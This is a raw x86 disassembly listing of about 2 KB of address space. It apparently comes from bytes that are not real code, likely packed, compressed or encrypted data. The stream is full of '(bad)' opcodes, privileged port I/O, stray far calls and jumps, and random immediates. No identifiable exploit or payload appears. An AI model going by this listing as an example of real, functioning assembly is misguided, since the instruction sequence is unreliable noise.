  41bbe9:	sbb    dl,BYTE PTR [edi]
  41bbeb:	jmp    0x41bb86
  41bbed:	jmp    0x90e732d1
  41bbf2:	jnp    0x41bc29
  41bbf4:	pushf  
  41bbf5:	sbb    eax,0x8cd0f9eb
  41bbfa:	xor    ebp,DWORD PTR [ebx-0x5c]
  41bbfd:	pop    ebp
  41bbfe:	push   0xb3806806
  41bc03:	stc    
  41bc04:	cmp    BYTE PTR cs:[ecx+0x1b],ch
  41bc08:	jl     0x41bc25
  41bc0a:	or     BYTE PTR [edx-0x53],bl
  41bc0d:	test   eax,0x38bb4a1e
  41bc12:	add    DWORD PTR [eax+ebx*1],edi
  41bc15:	inc    edi
  41bc16:	mov    ebp,0xc1dc00f2
  41bc1b:	jl     0x41bc5c
  41bc1d:	and    al,0xfe
  41bc1f:	ja     0x41bc89
  41bc21:	or     bl,BYTE PTR [esi]
  41bc23:	push   eax
  41bc24:	xchg   ebx,eax
  41bc25:	jecxz  0x41bca1
  41bc27:	xchg   ecx,eax
  41bc28:	cwde   
  41bc29:	inc    ecx
  41bc2a:	cwde   
  41bc2b:	jno    0x41bc26
  41bc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc2e:	pop    es
  41bc2f:	fist   DWORD PTR [eax-0x60]
  41bc32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc33:	dec    eax
  41bc34:	push   edi
  41bc35:	fcmovne st,st(2)
  41bc37:	iret   
  41bc38:	pop    ebx
  41bc39:	cmc    
  41bc3a:	pop    esi
  41bc3b:	fsubrp st(7),st
  41bc3d:	std    
  41bc3e:	into   
  41bc3f:	add    edi,ebp
  41bc41:	sub    esi,DWORD PTR [esi]
  41bc43:	push   esi
  41bc44:	dec    eax
  41bc45:	enter  0x687c,0xe0
  41bc49:	in     eax,0xc3
  41bc4b:	or     DWORD PTR [esi],0xbd2e3de4
  41bc51:	lods   eax,DWORD PTR ds:[esi]
  41bc52:	mov    DWORD PTR [esi-0x11],eax
  41bc55:	mov    edi,0x6005fc67
  41bc5a:	mov    ebp,0xf33c27d1
  41bc5f:	mov    eax,0x8ba86194
  41bc64:	pop    eax
  41bc65:	push   edx
  41bc66:	mov    bl,BYTE PTR [esi]
  41bc68:	fldenv [esi-0x178c0b1d]
  41bc6e:	pop    ds
  41bc6f:	ja     0x41bce2
  41bc71:	rcl    DWORD PTR [ecx+0x15],cl
  41bc74:	aam    0xd8
  41bc76:	sbb    eax,0x69197146
  41bc7b:	pop    ds
  41bc7c:	adc    al,0xc
  41bc7e:	leave  
  41bc7f:	out    0xc8,al
  41bc81:	je     0x41bcd4
  41bc83:	inc    edx
  41bc84:	leave  
  41bc85:	adc    ebp,DWORD PTR [ebx+0x74]
  41bc88:	out    dx,eax
  41bc89:	loop   0x41bc79
  41bc8b:	xchg   edi,eax
  41bc8c:	sbb    DWORD PTR [esi+0x70ad8d50],0x2f
  41bc93:	or     ecx,eax
  41bc95:	jnp    0x41bc50
	...
  41bd13:	add    ch,ch
  41bd15:	jle    0x41bd09
  41bd17:	ret    
  41bd18:	repz iret 
  41bd1a:	std    
  41bd1b:	jle    0x41bcfc
  41bd1d:	loope  0x41bd61
  41bd1f:	mov    al,0xb7
  41bd21:	dec    ebx
  41bd22:	inc    ebx
  41bd23:	test   ah,dh
  41bd25:	pop    edx
  41bd26:	add    DWORD PTR [eax],eax
  41bd28:	imul   eax,DWORD PTR [edi],0x0
  41bd2b:	add    BYTE PTR [edx],bh
  41bd2d:	inc    ebx
  41bd2e:	fs inc esp
  41bd30:	lahf   
  41bd31:	scas   eax,DWORD PTR es:[edi]
  41bd32:	xchg   esp,eax
  41bd33:	jmp    0x41bd10
  41bd35:	aaa    
  41bd36:	push   ebx
  41bd37:	call   0xca39c595
  41bd3c:	adc    al,BYTE PTR [esi]
  41bd3e:	jmp    0xd01c7ad1
  41bd43:	cmp    eax,0xf9714de1
  41bd48:	mov    cl,BYTE PTR [ebp-0x78acc725]
  41bd4e:	xor    eax,ebx
  41bd50:	test   eax,0x59717ce1
  41bd55:	adc    al,0xe3
  41bd57:	sbb    BYTE PTR [ebx+0x46],cl
  41bd5a:	mov    dl,BYTE PTR [ecx-0x58]
  41bd5d:	mov    al,ds:0xf2219b15
  41bd62:	mov    edi,0xd29af8dd
  41bd67:	or     eax,0xa54555f2
  41bd6c:	add    DWORD PTR [edx],edi
  41bd6e:	call   0x372a:0xcd72393f
  41bd75:	nop
  41bd76:	xchg   ebx,eax
  41bd77:	inc    edx
  41bd78:	dec    edi
  41bd79:	ds leave 
  41bd7b:	retf   
  41bd7c:	call   0xbdd6:0xf5646d3c
  41bd83:	pusha  
  41bd84:	pop    ebx
  41bd85:	aas    
  41bd86:	(bad)  
  41bd88:	push   ds
  41bd89:	add    eax,0xcc16503a
  41bd8e:	inc    ebx
  41bd8f:	lahf   
  41bd90:	cmp    BYTE PTR ds:0x8df1ba9a,bl
  41bd96:	fidivr WORD PTR [eax+0x21b84712]
  41bd9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd9d:	das    
  41bd9e:	dec    esp
  41bd9f:	jno    0x41bd2d
  41bda1:	or     eax,0x9bcc87df
  41bda6:	loop   0x41bd78
  41bda8:	push   edi
  41bda9:	aad    0x3c
  41bdab:	addr16 cs pop ebp
  41bdae:	pop    ecx
  41bdaf:	sbb    bl,BYTE PTR ds:0x60120f07
  41bdb5:	push   eax
  41bdb6:	mov    ebp,esi
  41bdb8:	sub    bl,BYTE PTR [ebp-0x198993dd]
  41bdbe:	inc    edi
  41bdbf:	inc    ebx
  41bdc0:	shl    DWORD PTR [eax],cl
  41bdc2:	xor    dh,dl
  41bdc4:	xchg   edx,eax
  41bdc5:	out    0xa,al
  41bdc7:	call   0x663b0a43
  41bdcc:	loope  0x41be2a
  41bdce:	jns    0x41be10
  41bdd0:	jne    0x41bdfb
  41bdd2:	arpl   si,bx
  41bdd4:	fsub   DWORD PTR [eax+0x24]
  41bdd7:	fsub   QWORD PTR [esi]
  41bdd9:	jb     0x41bda7
  41bddb:	push   0x6e
  41bddd:	call   0x669b:0xd40af0ab
  41bde4:	pop    edi
  41bde5:	arpl   bp,cx
  41bde7:	xchg   BYTE PTR [ecx+edi*4],dh
  41bdea:	sbb    eax,0x913752bc
  41bdef:	push   esp
  41bdf0:	sti    
  41bdf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf2:	push   edx
  41bdf3:	add    DWORD PTR [ecx+0x5a69f749],ebx
  41bdf9:	adc    esi,DWORD PTR [ebx+0x9]
  41bdfc:	push   eax
  41bdfd:	inc    ebp
  41bdfe:	jb     0x41bdc2
  41be00:	push   esp
  41be01:	jge    0x41be6a
  41be03:	ins    DWORD PTR es:[edi],dx
  41be04:	sub    al,bh
  41be06:	push   ebp
  41be07:	(bad)  
  41be08:	jecxz  0x41bdf6
  41be0a:	xchg   esi,eax
  41be0b:	mov    eax,ds:0x78118e7f
  41be10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be11:	push   0xfffffffc
  41be13:	mov    bl,0xc3
  41be15:	adc    al,0xaf
  41be17:	mov    eax,0x33ae7bd3
  41be1c:	adc    edx,0x2
  41be1f:	cmp    eax,0x3a2d36aa
  41be24:	je     0x41bdee
  41be26:	sub    bh,BYTE PTR [esp+edx*4]
  41be29:	cmp    DWORD PTR [ecx],edx
  41be2b:	dec    edx
  41be2c:	dec    edx
  41be2d:	mov    eax,ds:0x7a99cf2d
  41be32:	or     eax,eax
  41be34:	nop
  41be35:	xlat   BYTE PTR ds:[ebx]
  41be36:	mov    ebx,0x7981ebc3
  41be3b:	and    bl,ch
  41be3d:	inc    eax
  41be3e:	addr16 push ss
  41be40:	lea    edi,[esi]
  41be42:	bnd call 0x27ea46d4
  41be48:	bound  ecx,QWORD PTR [eax]
  41be4a:	addr16 mov ds:0xd7c5,al
  41be4e:	scas   eax,DWORD PTR es:[edi]
  41be4f:	or     esp,esi
  41be51:	ss cmp eax,0x7bf18b7b
  41be57:	xlat   BYTE PTR ds:[ebx]
  41be58:	cmp    eax,0xc807ca33
  41be5d:	cs jno 0x41be0a
  41be60:	icebp  
  41be61:	retf   
  41be62:	and    eax,0x55aee970
  41be67:	jmp    0x41be3f
  41be69:	lods   al,BYTE PTR ds:[esi]
  41be6a:	gs add eax,0xc0d32291
  41be70:	mov    edi,0xd23b6518
  41be75:	callw  0xf6cb
  41be79:	ss scas al,BYTE PTR es:[edi]
  41be7b:	loopne 0x41be26
  41be7d:	xchg   ch,bl
  41be7f:	push   ds
  41be80:	cmp    BYTE PTR [eax],0xb8
  41be83:	out    dx,eax
  41be84:	or     dh,cl
  41be86:	push   esp
  41be87:	adc    ah,cl
  41be89:	jnp    0x41be40
  41be8b:	int3   
  41be8c:	das    
  41be8d:	mov    ds:0x553508c2,eax
  41be92:	xor    bh,BYTE PTR [eax+0x6e]
  41be95:	mov    edx,0x1bf936be
  41be9a:	jb     0x41bed1
  41be9c:	push   edx
  41be9d:	repz data16 mov bh,0xce
  41bea1:	je     0x41bebe
  41bea3:	dec    esi
  41bea4:	mov    esp,0x3e1dbba1
  41bea9:	inc    ebx
  41beaa:	sar    BYTE PTR [edx-0x74],cl
  41bead:	das    
  41beae:	or     bh,dl
  41beb0:	aaa    
  41beb1:	test   DWORD PTR [edi],eax
  41beb3:	sub    DWORD PTR [edx-0x3c],0x4e54b773
  41beba:	mov    DWORD PTR [ecx],0x54709509
  41bec0:	mov    fs,WORD PTR ds:0xe1b45e9c
  41bec6:	push   ebp
  41bec7:	in     eax,dx
  41bec8:	stos   DWORD PTR es:[edi],eax
  41bec9:	mov    eax,ds:0x40b9b02f
  41bece:	mov    dl,0x2a
  41bed0:	jle    0x41bf4d
  41bed2:	inc    ecx
  41bed3:	ja     0x41be70
  41bed5:	lahf   
  41bed6:	(bad)  
  41bed7:	mov    es,WORD PTR [ecx+0x2019b3b3]
  41bedd:	imul   ebp,DWORD PTR [edi+0x6f],0x12
  41bee1:	cmp    BYTE PTR [ebx],bl
  41bee3:	push   0x8368ebe1
  41bee8:	mov    eax,DWORD PTR [ecx+ebx*4]
  41beeb:	mov    ds:0xc1f60d6e,al
  41bef0:	push   esi
  41bef1:	lods   eax,DWORD PTR es:[esi]
  41bef3:	dec    eax
  41bef4:	in     eax,dx
  41bef5:	nop
  41bef6:	scas   al,BYTE PTR es:[edi]
  41bef7:	or     bh,bl
  41bef9:	cdq    
  41befa:	and    al,0xa7
  41befc:	mov    cl,bh
  41befe:	and    bh,0xd5
  41bf01:	sub    bl,BYTE PTR [eax+0x24]
  41bf04:	sbb    ebp,ebp
  41bf06:	and    ch,BYTE PTR [edi]
  41bf08:	or     BYTE PTR [esi+0x60],cl
  41bf0b:	pop    edx
  41bf0c:	jo     0x41bf52
  41bf0e:	mov    esp,0x554846da
  41bf13:	push   esp
  41bf14:	mov    ebp,0x37325a81
  41bf19:	pop    esi
  41bf1a:	push   ebp
  41bf1b:	out    dx,eax
  41bf1c:	mov    WORD PTR [ebp+0x55264af],ds
  41bf22:	fistp  DWORD PTR [esi+0x403094fa]
  41bf28:	fldz   
  41bf2a:	sti    
  41bf2b:	pop    esi
  41bf2c:	or     BYTE PTR [eax+0x36],dl
  41bf2f:	pop    ebp
  41bf30:	add    eax,0xa8aa81cd
  41bf35:	jo     0x41bf50
  41bf37:	sub    ebx,edi
  41bf39:	pop    ebp
  41bf3a:	mov    WORD PTR [esi-0x5e],gs
  41bf3d:	jns    0x41befe
  41bf3f:	sbb    al,0xdb
  41bf41:	test   eax,0xbf1a5eb7
  41bf46:	sbb    eax,0xd1045dde
  41bf4b:	inc    edi
  41bf4c:	push   edi
  41bf4d:	pop    edx
  41bf4e:	pop    edx
  41bf4f:	push   ecx
  41bf50:	add    bh,dl
  41bf52:	ds cwde 
  41bf54:	or     eax,0x42d9a5aa
  41bf59:	jge    0x41bfcc
  41bf5b:	loopne 0x41bfbc
  41bf5d:	dec    esp
  41bf5e:	jle    0x41bf6a
  41bf60:	pop    edi
  41bf61:	jne    0x41bf8e
  41bf63:	(bad)  
  41bf64:	aam    0x38
  41bf66:	cmp    al,0x22
  41bf68:	mul    BYTE PTR [edx-0x2e7d440f]
  41bf6e:	inc    ebx
  41bf6f:	inc    ecx
  41bf70:	push   eax
  41bf71:	jecxz  0x41bf57
  41bf73:	jmp    0x41bf0a
  41bf75:	mov    dl,BYTE PTR [ebp+0x27924f7c]
  41bf7b:	xchg   BYTE PTR [edx],dl
  41bf7d:	aad    0x3b
  41bf7f:	jecxz  0x41bffc
  41bf81:	mov    al,0xe3
  41bf83:	push   eax
  41bf84:	stos   DWORD PTR es:[edi],eax
  41bf85:	jecxz  0x41bfb9
  41bf87:	fnstenv [edx-0x58]
  41bf8a:	mov    ds:0xfeed536e,al
  41bf8f:	aas    
  41bf90:	and    bl,ch
  41bf92:	jl     0x41bf66
  41bf94:	jle    0x41c00c
  41bf96:	sub    eax,esp
  41bf98:	fcom   DWORD PTR [ebx+0x62dfbba7]
  41bf9e:	addr16 fwait
  41bfa0:	std    
  41bfa1:	shr    DWORD PTR [ebx],0x48
  41bfa4:	mov    ch,0x46
  41bfa6:	aas    
  41bfa7:	cli    
  41bfa8:	shl    DWORD PTR [eax-0x27],1
  41bfab:	dec    ebx
  41bfac:	inc    esp
  41bfad:	leave  
  41bfae:	dec    eax
  41bfaf:	ret    0x37bb
  41bfb2:	mov    ebp,0x1c4c8f9d
  41bfb7:	jmp    0xc776:0x6f983416
  41bfbe:	inc    ebp
  41bfbf:	icebp  
  41bfc0:	dec    esi
  41bfc1:	add    al,0xe7
  41bfc3:	int    0x97
  41bfc5:	xlat   BYTE PTR ds:[ebx]
  41bfc6:	or     BYTE PTR [ecx-0x46],0x96
  41bfca:	push   es
  41bfcb:	outs   dx,DWORD PTR ds:[esi]
  41bfcc:	test   ecx,ebp
  41bfce:	dec    edx
  41bfcf:	sbb    al,0xd0
  41bfd1:	mov    ah,0xb6
  41bfd3:	shl    BYTE PTR [ebx+0x426da82a],1
  41bfd9:	sub    eax,0xda349e14
  41bfde:	in     eax,dx
  41bfdf:	and    edx,0xee6bd822
  41bfe5:	in     eax,0xff
  41bfe7:	shl    eax,0x77
  41bfea:	inc    ecx
  41bfeb:	mov    al,ds:0x8e69bc83
  41bff0:	and    eax,0x3258547b
  41bff5:	jmp    0xa1f0:0xba0db0fa
  41bffc:	xchg   ecx,eax
  41bffd:	cmc    
  41bffe:	out    0x2c,al
  41c000:	or     al,0x87
  41c002:	mov    ebx,0xa3e6cddf
  41c007:	(bad)  
  41c009:	int    0x3f
  41c00b:	mov    cl,0x9b
  41c00d:	add    DWORD PTR [esi-0x63fe201c],esi
  41c013:	int    0xd0
  41c015:	sbb    DWORD PTR [eax-0x36],esp
  41c018:	and    edi,DWORD PTR [esi+0x17f119c9]
  41c01e:	cwde   
  41c01f:	mov    ecx,0x44a94694
  41c024:	jne    0x41c05b
  41c026:	inc    edx
  41c027:	dec    ebp
  41c028:	add    eax,0x21b0c1ea
  41c02d:	fwait
  41c02e:	psubd  mm3,QWORD PTR [edx+esi*4-0x1a]
  41c033:	mov    cl,0x7d
  41c035:	xor    ebp,DWORD PTR [eax-0x4bc5eafb]
  41c03b:	ds cs xchg esp,eax
  41c03e:	sti    
  41c03f:	inc    ebp
  41c040:	adc    cl,BYTE PTR [ebx+eax*1-0x7d21b97c]
  41c047:	out    0x64,eax
  41c049:	mov    ecx,0x90fb1e76
  41c04e:	outs   dx,DWORD PTR ds:[esi]
  41c04f:	scas   al,BYTE PTR es:[edi]
  41c050:	in     al,0xc5
  41c052:	mov    ds:0x4838985,al
  41c057:	push   ebp
  41c058:	push   ebx
  41c059:	sbb    eax,DWORD PTR [ebp+0x1fbf239e]
  41c05f:	xor    al,0xef
  41c061:	jno    0x41c0d0
  41c063:	outs   dx,BYTE PTR ds:[esi]
  41c064:	das    
  41c065:	mov    esp,0xadc3cf8f
  41c06a:	cmp    DWORD PTR [eax+0x4],ebp
  41c06d:	xor    edi,ebx
  41c06f:	pop    edi
  41c070:	rcl    BYTE PTR [eax-0x41],0x94
  41c074:	data16 stc 
  41c076:	std    
  41c077:	(bad)  
  41c078:	mov    eax,ds:0x489a8eff
  41c07d:	mov    ds:0x73e68db1,eax
  41c082:	pushf  
  41c083:	retf   0x8c52
  41c086:	dec    esi
  41c087:	popf   
  41c088:	pop    ebp
  41c089:	jbe    0x41c011
  41c08b:	(bad)  
  41c08c:	out    dx,al
  41c08d:	shl    DWORD PTR [esi-0x5c],cl
  41c090:	inc    esi
  41c091:	and    esi,DWORD PTR [edx-0x2c30c011]
  41c097:	jg     0x41c0b1
  41c099:	fist   DWORD PTR [edi-0x78]
  41c09c:	loop   0x41c0b3
  41c09e:	aad    0xf3
  41c0a0:	adc    esi,DWORD PTR [ecx+eiz*4+0x79]
  41c0a4:	cmp    eax,DWORD PTR [edi-0x3051d4c1]
  41c0aa:	test   eax,0xb28a9f4d
  41c0af:	in     al,0xb2
  41c0b1:	test   al,0x3a
  41c0b3:	cs mov edi,0x323fce04
  41c0b9:	add    DWORD PTR [ebp-0x3a],esp
  41c0bc:	xchg   edi,eax
  41c0bd:	stc    
  41c0be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0bf:	adc    bl,BYTE PTR [ecx+edi*2+0x77]
  41c0c3:	push   ebp
  41c0c4:	dec    esp
  41c0c5:	cmc    
  41c0c6:	push   ss
  41c0c7:	xchg   edx,eax
  41c0c8:	jns    0x41c0a7
  41c0ca:	call   0x7acc:0xdcbc498f
  41c0d1:	mov    bl,0x9c
  41c0d3:	popf   
  41c0d4:	sub    DWORD PTR [ebx+0x2ddc4d],0x18
  41c0db:	cmc    
  41c0dc:	scas   eax,DWORD PTR es:[edi]
  41c0dd:	mov    edi,0xb6724714
  41c0e3:	mov    al,0x3d
  41c0e5:	dec    edx
  41c0e6:	sbb    dh,BYTE PTR [ebx-0x5d]
  41c0e9:	(bad)  
  41c0ea:	dec    ebx
  41c0eb:	push   ds
  41c0ec:	sbb    dl,BYTE PTR [edi-0x68]
  41c0ef:	ins    BYTE PTR es:[edi],dx
  41c0f0:	pop    edi
  41c0f1:	dec    eax
  41c0f2:	pop    ebx
  41c0f3:	std    
  41c0f4:	xor    DWORD PTR [ebp+0x53],ecx
  41c0f7:	mov    ebp,0x650b6049
  41c0fc:	mov    ah,al
  41c0fe:	xchg   edi,eax
  41c0ff:	push   ss
  41c100:	cmp    edx,ebp
  41c102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c103:	mov    esp,0xfd14520a
  41c108:	mov    ds:0x50192fb5,eax
  41c10d:	sbb    DWORD PTR [ebp*8-0x2c61f026],esp
  41c114:	aad    0xc1
  41c116:	lods   eax,DWORD PTR ds:[esi]
  41c117:	inc    ebx
  41c118:	inc    esi
  41c119:	imul   DWORD PTR [ecx]
  41c11b:	ds xchg ebp,eax
  41c11d:	leave  
  41c11e:	out    0x11,eax
  41c120:	sub    DWORD PTR [esi],edx
  41c122:	xchg   esi,eax
  41c123:	mov    al,0xf
  41c125:	(bad)  
  41c126:	or     al,0x74
  41c128:	sbb    al,0x47
  41c12a:	scas   al,BYTE PTR es:[edi]
  41c12b:	sbb    al,0xda
  41c12d:	or     eax,0x77e8bc9e
  41c132:	mov    bh,0x1
  41c134:	dec    ecx
  41c135:	fidivr DWORD PTR [edi-0x26]
  41c138:	stos   DWORD PTR es:[edi],eax
  41c139:	fcom   QWORD PTR [ebx+0x4cf5299a]
  41c13f:	sbb    BYTE PTR [ecx],cl
  41c141:	push   edi
  41c142:	std    
  41c143:	mov    ecx,0xa5b37e2b
  41c148:	push   ds
  41c149:	aas    
  41c14a:	jmp    FWORD PTR [ebx-0x3ebbd8c8]
  41c150:	(bad)  
  41c151:	adc    al,0x6e
  41c153:	and    cl,BYTE PTR [ecx-0x56]
  41c156:	pop    esp
  41c157:	fwait
  41c158:	pop    ecx
  41c159:	retf   
  41c15a:	(bad)  
  41c15b:	cmp    BYTE PTR [ebp+0x17],ch
  41c15e:	outs   dx,DWORD PTR ds:[esi]
  41c15f:	xchg   ecx,eax
  41c160:	call   0x54fb:0xec44079d
  41c167:	mov    ch,0x33
  41c169:	imul   ebp,DWORD PTR [ebx+0x1e7a76a8],0xa76ef70
  41c173:	aam    0x53
  41c175:	dec    ecx
  41c176:	sub    ah,bl
  41c178:	or     BYTE PTR [ebp+0x3e],0xf4
  41c17c:	inc    edx
  41c17d:	sub    edx,DWORD PTR [ebp-0x1eb1fd88]
  41c183:	in     al,0xde
  41c185:	outs   dx,DWORD PTR ds:[esi]
  41c186:	shl    DWORD PTR [ebp-0x47edc057],1
  41c18c:	iret   
  41c18d:	stc    
  41c18e:	jbe    0x41c1cc
  41c190:	mov    esi,0xfec02c6
  41c195:	push   ss
  41c196:	(bad)  
  41c198:	iret   
  41c199:	adc    eax,0x3ffe4f3d
  41c19f:	sub    DWORD PTR [ecx],esi
  41c1a1:	or     eax,0x31389072
  41c1a6:	jge    0x41c1d2
  41c1a8:	cmp    BYTE PTR [esi],ah
  41c1aa:	push   0x78
  41c1ac:	cld    
  41c1ad:	nop
  41c1ae:	pop    es
  41c1af:	mov    es,ebp
  41c1b1:	not    DWORD PTR [ebx]
  41c1b3:	mov    esi,0x7cf988e0
  41c1b8:	int3   
  41c1b9:	(bad)  
  41c1ba:	out    dx,eax
  41c1bb:	lahf   
  41c1bc:	retf   0xf86b
  41c1bf:	pusha  
  41c1c0:	mov    ch,0xa8
  41c1c2:	mov    esi,edx
  41c1c4:	sub    esp,DWORD PTR ds:0x4f4ba0c3
  41c1ca:	pusha  
  41c1cb:	push   es
  41c1cc:	sub    BYTE PTR [esi+0x11637df],cl
  41c1d2:	daa    
  41c1d3:	dec    edx
  41c1d4:	sbb    al,BYTE PTR [edi+ecx*8+0x555573ab]
  41c1db:	mov    WORD PTR [edx],ds
  41c1dd:	(bad)  
  41c1de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1df:	push   0xffffffc4
  41c1e1:	ficom  WORD PTR [edi+ebx*8+0x2b]
  41c1e5:	mov    edx,0xe818eb1a
  41c1ea:	ret    
  41c1eb:	sbb    eax,0xf6071c44
  41c1f0:	cmp    al,0x7f
  41c1f2:	fucom  st(1)
  41c1f4:	lahf   
  41c1f5:	sub    BYTE PTR [edi],dh
  41c1f7:	jno    0x41c1a3
  41c1f9:	hlt    
  41c1fa:	les    ecx,FWORD PTR [eax]
  41c1fc:	sub    DWORD PTR [eax-0x38052fe6],ebx
  41c202:	lock pop ss
  41c204:	jmp    0x8157:0x2f959cc2
  41c20b:	xchg   ebx,eax
  41c20c:	xor    cl,cl
  41c20e:	fdivr  st(3),st
  41c210:	idiv   DWORD PTR [eax]
  41c212:	push   ds
  41c213:	bnd jns 0x41c28a
  41c216:	cs jl  0x41c1de
  41c219:	fdiv   DWORD PTR [ebx+0x65]
  41c21c:	xchg   ebx,eax
  41c21d:	inc    edx
  41c21e:	jno    0x41c1d3
  41c220:	mov    dh,0xf
  41c222:	enter  0x75d0,0xf
  41c226:	push   0x3a3daf7e
  41c22b:	mov    ?,WORD PTR [ecx+0x14745abf]
  41c231:	dec    edi
  41c232:	fwait
  41c233:	sub    cl,bh
  41c235:	(bad)  
  41c237:	jnp    0x41c249
  41c239:	xor    BYTE PTR [ecx],bl
  41c23b:	(bad)  
  41c23c:	hlt    
  41c23d:	cmp    eax,0x842e55bf
  41c242:	ss pushf 
  41c244:	xchg   ebx,eax
  41c245:	les    edi,FWORD PTR [edx+0xea597f6]
  41c24b:	mov    ebx,0xba1b6e30
  41c250:	jp     0x41c2bf
  41c252:	cs scas al,BYTE PTR es:[edi]
  41c254:	inc    ebp
  41c255:	mov    ecx,0xc19e1230
  41c25a:	mov    esp,0x937f82f6
  41c25f:	sbb    al,BYTE PTR [ebx]
  41c261:	and    al,0x80
  41c263:	push   es
  41c264:	mov    ah,0x0
  41c266:	std    
  41c267:	(bad)  
  41c268:	leave  
  41c269:	test   DWORD PTR [ebx-0x406a393],0x7fce235
  41c273:	push   0xa21212d
  41c278:	jle    0x41c232
  41c27a:	fs cli 
  41c27c:	mov    DWORD PTR [esi+0x7ee4982b],edi
  41c282:	into   
  41c283:	or     al,0xb9
  41c285:	mov    eax,0x74a0bf7e
  41c28a:	cdq    
  41c28b:	aaa    
  41c28c:	mov    al,ds:0xa641ae4c
  41c291:	or     esp,esi
  41c293:	jo     0x41c30b
  41c295:	imul   eax,DWORD PTR [ebx+edi*2+0x271c1ea],0xac11c4e0
  41c2a0:	js     0x41c29e
  41c2a2:	cdq    
  41c2a3:	outs   dx,DWORD PTR ds:[esi]
  41c2a4:	xchg   edx,eax
  41c2a5:	pop    esi
  41c2a6:	xchg   BYTE PTR [ebp+0x21],ch
  41c2a9:	(bad)  
  41c2aa:	fnstenv [esi-0x588025f5]
  41c2b0:	dec    ebx
  41c2b1:	push   esi
  41c2b2:	push   0x8a0be142
  41c2b7:	cli    
  41c2b8:	stos   BYTE PTR es:[edi],al
  41c2b9:	jne    0x41c339
  41c2bb:	sbb    esi,DWORD PTR [ecx+0x7d13ccfd]
  41c2c1:	mov    edx,0xa3fc118b
  41c2c6:	hlt    
  41c2c7:	sub    eax,0xd15048b6
  41c2cc:	dec    ebx
  41c2cd:	cmp    esp,eax
  41c2cf:	push   edx
  41c2d0:	in     al,0x33
  41c2d2:	cmp    BYTE PTR [ecx+0x41],ch
  41c2d5:	sbb    eax,0xb3e4604b
  41c2da:	xor    eax,0x435931b7
  41c2df:	inc    esp
  41c2e0:	fadd   QWORD PTR [ebx]
  41c2e2:	arpl   di,di
  41c2e4:	sub    BYTE PTR [ebx+0x40f02e39],bl
  41c2ea:	test   DWORD PTR [edx],edx
  41c2ec:	mov    bl,0xc
  41c2ee:	push   esi
  41c2ef:	xchg   ebp,eax
  41c2f0:	mov    edx,0x23310026
  41c2f5:	popf   
  41c2f6:	loope  0x41c2e9
  41c2f8:	mov    fs,WORD PTR [edx]
  41c2fa:	pop    ebx
  41c2fb:	das    
  41c2fc:	add    al,0x3c
  41c2fe:	fimul  WORD PTR [ecx-0x3053c621]
  41c304:	xchg   BYTE PTR [ebx],cl
  41c306:	cmp    cl,dl
  41c308:	imul   ecx,ecx,0xfdcca635
  41c30e:	push   edx
  41c30f:	test   DWORD PTR [ecx-0x278d32de],0xb0668e3b
  41c319:	inc    ebx
  41c31a:	inc    edi
  41c31b:	xor    edi,DWORD PTR [edi]
  41c31d:	mov    ah,0xd5
  41c31f:	leave  
  41c320:	jne    0x41c2ce
  41c322:	and    eax,ebp
  41c324:	dec    esp
  41c325:	add    BYTE PTR [ecx-0x4a],cl
  41c328:	sub    al,0x70
  41c32a:	pop    ds
  41c32b:	inc    ebx
  41c32c:	or     esi,esi
  41c32e:	shl    BYTE PTR [esi-0x2e],cl
  41c331:	fdivr  DWORD PTR [eax]
  41c333:	inc    ecx
  41c334:	(bad)  
  41c335:	sbb    esp,ebp
  41c337:	and    eax,0xdcf8217c
  41c33c:	fsub   st,st(2)
  41c33e:	pop    ds
  41c33f:	int3   
  41c340:	mov    ecx,0xedf447a0
  41c345:	pusha  
  41c346:	sub    eax,0x6850b7a9
  41c34b:	sub    cl,al
  41c34d:	out    0x71,eax
  41c34f:	pop    edx
  41c350:	gs xchg edi,eax
  41c352:	std    
  41c353:	mov    ah,0x87
  41c355:	jae    0x41c310
  41c357:	dec    eax
  41c358:	int    0x64
  41c35a:	popa   
  41c35b:	rol    BYTE PTR [ecx+ebp*1-0x3a],cl
  41c35f:	les    ecx,FWORD PTR [esi]
  41c361:	aad    0x72
  41c363:	in     eax,dx
  41c364:	mov    ecx,DWORD PTR [edx+0x1d]
  41c367:	xchg   edi,eax
  41c368:	inc    esi
  41c369:	add    al,0x3d
  41c36b:	scas   al,BYTE PTR es:[edi]
  41c36c:	fs cmc 
  41c36e:	lahf   
  41c36f:	hlt    
  41c370:	cli    
  41c371:	cmp    al,0xc8
  41c373:	out    dx,eax
  41c374:	ss retf 
  41c376:	cmp    cl,cl
  41c378:	or     ecx,DWORD PTR [eax]
  41c37a:	cwde   
  41c37b:	cld    
  41c37c:	inc    esi
  41c37d:	mov    ah,0x2b
  41c37f:	inc    ecx
  41c380:	xor    esi,DWORD PTR [edi+0x6d0673e7]
  41c386:	mov    al,0xc5
  41c388:	jle    0x41c347
  41c38a:	xor    ebp,DWORD PTR [ebp+0x17b23cdd]
  41c390:	adc    dl,BYTE PTR [ecx]
  41c392:	aam    0xb
  41c394:	mul    BYTE PTR [esi]
  41c396:	mov    WORD PTR es:[edi+0x3b],?
  41c39a:	cmp    al,dh
  41c39c:	fidivr DWORD PTR [ebx+ebx*4+0x6a707d19]
  41c3a3:	out    dx,al
  41c3a4:	cwde   
  41c3a5:	cld    
  41c3a6:	stos   BYTE PTR es:[edi],al
  41c3a7:	nop
  41c3a8:	cmp    eax,0x342c09c6
  41c3ad:	mov    ds:0x3d71e53b,al
  41c3b2:	or     eax,0xadd6c9d5
  41c3b7:	push   ebp
  41c3b8:	cli    
  41c3b9:	rol    DWORD PTR [ecx+eiz*1+0x26bdf0c3],0x1a
  41c3c1:	(bad)  
  41c3c2:	adc    edi,DWORD PTR [edi+0xc]
  41c3c5:	lds    esp,FWORD PTR [ebx+0x692fd845]
  41c3cb:	jo     0x41c3b7
  41c3cd:	pushf  
  41c3ce:	dec    ebx
  41c3cf:	xor    dl,BYTE PTR es:[edi-0x69]
  41c3d3:	xlat   BYTE PTR ds:[ebx]
  41c3d4:	mov    ah,0x55
  41c3d6:	add    DWORD PTR [ebp+edi*1-0x2f323f11],esp
  41c3dd:	ins    BYTE PTR es:[edi],dx
